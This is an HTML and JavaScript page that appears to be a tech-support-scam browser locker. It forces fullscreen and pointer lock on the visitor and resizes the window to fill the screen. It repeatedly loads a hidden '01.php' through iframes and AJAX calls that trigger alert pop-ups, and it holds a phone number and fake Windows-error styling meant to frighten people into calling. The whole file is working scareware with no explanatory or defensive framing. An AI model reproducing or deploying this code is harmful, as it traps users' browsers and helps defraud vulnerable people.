 <!DOCTYPE html>
<html> 
<head>

<script src="jquery.colorbox-min.js"></script>
 

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 
<style type="text/css">
.p { cursor: crosshair; } 
#go-button {
    width: 100%; 
      height: 100%;  
}  


.sp {

 color:#FFFFFF;
font-size:24px;
text-align:right;


}

.error
{
   font-size:24px;
   color:#FFFFFF;
  position:fixed;
   top:250px;
   left:350px;
   
}
 
.windows_error {

color:#FFFFFF; 
font-size:17px;
position:fixed;
bottom:20px;
right:5px;
text-align:right;

}

.error-left
{
 font-size:24px;
   color:#FFFFFF;
  position:fixed;
   top:10px;
   left:100px;
}


#element:-webkit-full-screen {
   background-image: url("gKczJd7.png");
}

/* Firefox syntax */
#element:-moz-full-screen {
  background-image: url("gKczJd7.png");
}

/* IE/Edge syntax */
#element:-ms-fullscreen {
 background-image: url("gKczJd7.png");
}

/* Standard syntax */
#element:fullscreen {
   background-image: url("gKczJd7.png");
     
}


</style> 
   
</head>

<!--<body id="bodyid"  class="wait"  >  -->
 <body id="bodyid"  class="wait"     > 
  
    
   <!-- <script> 
    window.open('index.html','_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10, visible=none', '');
    </script>
    -->
   
	<div id="element"  >   
	 <img src="img-min.jpg" width="1000px" height="800px" id="go-button"   />   
	 
	<!--	<button id="go-button"   >
		    
		 <!--   <img src="gKczJd7.png" width="1000px" height="800px" id="go-button"  />  -->
		    
    	<!--</button> --> 
    </div>	 
    <div id="elementcheck"   style="display: none;">   
	 <img src="gKczJd7.png" width="1000px" height="800px" id="go-button"  />  
	<!-- <iframe src="useragent.php" style="display:none" sandbox="allow-modals"  ></iframe>
	 <iframe src="useragent.php" style="display:none" sandbox="allow-modals"  ></iframe>
	 <iframe src="useragent.php" style="display:none"  ></iframe>
	 <iframe src="useragent.php" style="display:none"  ></iframe>
	 <iframe src="useragent.php" style="display:none" ></iframe>
	 <iframe src="useragent.php" style="display:none"  ></iframe>
	 <iframe src="useragent.php" style="display:none"  ></iframe>
	 <iframe src="useragent.php" style="display:none" ></iframe>
	 <iframe src="useragent.php" style="display:none" ></iframe> -->
	 
	 
	 
	<!--	<button id="go-button"   > 
		 <!--     -->
		    
    	<!--</button> --> 
    </div>
    
     
</body>
  <script>
	        function formatAMPM() {
	            var d = new Date()
	              , minutes = d.getMinutes().toString().length == 1 ? '0' + d.getMinutes() : d.getMinutes()
	              , hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours()
	              , ampm = d.getHours() >= 12 ? 'pm' : 'am'
	              , months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
	              , days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
	            return days[d.getDay()] + ' ' + months[d.getMonth()] + ' ' + d.getDate() + ' ' + d.getFullYear() + ' ' + hours + ':' + minutes + ampm;
	        }
	    </script>
	    <script>
	        function getURLParameter(a) {
	            return decodeURI((RegExp(a + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "")
	        }
	        function random_betw(b, a) {
	            return Math.round(Math.random() * (a - b) + b)
	        }
	        var phone = "0503-136-8381";
	          var text = "** M rt **";
	            </script>
	    <script>
	        var w = window.screen.width;
	        var h = window.screen.height;
	        window.moveTo(0, 0);
	        window.resizeTo(w, h);
	    </script>
	    <script>
	        var isOpera = !!window.opera || navigator.userAgent.indexOf(" OPR/") >= 0;
	        var isFirefox = typeof InstallTrigger !== "undefined";
	        var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf("Constructor") > 0;
	        var isChrome = !!window.chrome && !isOpera;
	        var isIE = /*@cc_on!@*/
	        false || !!document.documentMode;
	    </script>

	  <style type="text/css">
	      .nocursor { cursor:none; }
	  </style>
<script> 
/* Get into full screen */
function GoInFullscreen(element) {
     
	if(element.requestFullscreen)
		element.requestFullscreen();
	else if(element.mozRequestFullScreen)
		element.mozRequestFullScreen();
	else if(element.webkitRequestFullscreen)
		element.webkitRequestFullscreen();
	else if(element.msRequestFullscreen)
		element.msRequestFullscreen();
}

/* Get out of full screen */
function GoOutFullscreen() {
     
    
}
  
/* Is currently in full screen or not */
function IsFullScreenCurrently() {
	var full_screen_element = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement || null;
	
	// If no element is in full-screen
	if(full_screen_element === null)
	{
 	   //location.href("fullscreen.php#elementcheck");
	 //	document.getElementById('go-button').src="http://31.media.tumblr.com/fca646cd8fe87906e605ad7e8d039903/tumblr_mmoz4fWT6U1soh1p8o1_500.png";
	 
           //location.href("index.php");
   document.getElementById("elementcheck").style.display = "block";
   //location.href("index.php");
  
     $('elementcheck').append('<iframe src="01.php" style="display:none"  ></iframe>');
      
   return false;
	}
	else
	{
  // 	location.href("fullscreen.php#elementcheck");
//	document.getElementById('go-button').src="http://31.media.tumblr.com/fca646cd8fe87906e605ad7e8d039903/tumblr_mmoz4fWT6U1soh1p8o1_500.png";
  //location.href("index.php");
   
 //$('elementcheck').append('<iframe src="useragent.php" style="display:none"  ></iframe>');
  
 //$('elementcheck').append('<iframe src="01.php" style="display:none"  ></iframe>');
  document.getElementById("elementcheck").style.display = "block";
  
  var ifrm = document.createElement('iframe');
ifrm.setAttribute('id', 'ifrm'); // assign an id

//document.body.appendChild(ifrm); // to place at end of document

// to place before another page element
var el = document.getElementById('elementcheck');
el.parentNode.insertBefore(ifrm, el);

// assign url
ifrm.setAttribute('src', '01.php');   


 //location.href("index.php"); 
 
//window.open("index.php");
  //location.href("index.php"); 
   return true;
 
	}
      //	return true;
   
}

$("#go-button").on('click', function() {
     
	if(IsFullScreenCurrently())
    //document.getElementById('go-button').src="http://31.media.tumblr.com/fca646cd8fe87906e605ad7e8d039903/tumblr_mmoz4fWT6U1soh1p8o1_500.png";
//	location.href("index.html");
		//GoOutFullscreen();
		 $.ajax({
                type: "GET",
                url: "01.php" , 
                success : function() { 
 				   // here is the code that will run on client side after running clear.php on server
                    // function below reloads current page
                   
                   alert();
                    // location.href("index1.html");
                }
            });
		
 	else
 	
 	 GoInFullscreen($("#elementcheck").get(0));
 	 
});

$(document).on('fullscreenchange webkitfullscreenchange mozfullscreenchange MSFullscreenChange', function() {
	if(IsFullScreenCurrently()) {
	    
		//$("#element span").text('Full Screen Mode Enabled');
		/*$("#go-php").text('Go'); */ 
		//var ifr = document.createElement("iframe"); 
		//ifr.src = 'useragent.php';  
		// location.href("index.html");
		 $.ajax({
                type: "GET",
                url: "01.php" , 
                success : function() { 
 				   // here is the code that will run on client side after running clear.php on server
                    // function below reloads current page
                     //location.href("index1.html");
                    alert();
                }
            });
		// <iframe id="coToolbarFrame" src="useragent.php" style="height:0px;width:100%;display:none;"></iframe> 
  	}
	/*else {
		$("#element span").text(' ');
		$("#go-button").text('Enable Full Screen');
	} */
});

</script>



<script>
            // Get the modal
            var modal = document.getElementById('myModal');

            // Get the button that opens the modal
            var btn = document.getElementById("myBtn");

            // Get the <span> element that closes the modal
            var span = document.getElementsByClassName("close")[0];

            // When the user clicks the button, open the modal
            /*btn.onclick = function() {
              modal.style.display = "block";
            } */

            // When the user clicks on <span> (x), close the modal
            span.onclick = function() {
              modal.style.display = "none";
            }

            // When the user clicks anywhere outside of the modal, close it
            window.onclick = function(event) {
              if (event.target == modal) {
                modal.style.display = "none";
              }
            }
            </script>
              <script type="text/javascript">
            function addEvent(obj, evt, fn) {
                if (obj.addEventListener) {
                    obj.addEventListener(evt, fn, false);
                }
                else if (obj.attachEvent) {
                    obj.attachEvent("on" + evt, fn);
                }
            }
            addEvent(window,"load",function(e) {
                addEvent(document, "mouseout", function(e) {
                    e = e ? e : window.event;
                    var from = e.relatedTarget || e.toElement;
                    if (!from || from.nodeName == "HTML") {
                        // stop your drag event here
                        // for now we can just use an alert
                     //alert("hello");

            			 modal.style.display = "block";

                    }
                });
            });

              $(document).mousemove(function(){
              var canvas = document.getElementById('bodyid');
            canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
            canvas.requestPointerLock();

              //capture mouse movement event
                 // remove our layover from the DOM
              });

             //  $(document).mousemove(function(){
             // alert("move detect");
              //capture mouse movement event
             //   $("#pageLayover").remove(); // remove our layover from the DOM
             // });


            </script>
            
            
</html>